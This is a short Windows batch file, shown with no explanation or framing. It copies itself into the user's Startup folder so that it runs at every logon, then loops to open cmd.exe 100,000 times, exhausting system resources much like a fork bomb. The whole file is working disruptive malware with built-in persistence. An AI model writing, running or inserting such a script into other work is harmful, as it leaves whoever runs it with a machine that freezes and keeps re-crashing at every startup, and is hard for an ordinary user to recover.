@echo off
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
for /L %%i in (1,1,100000) do (start cmd.exe)

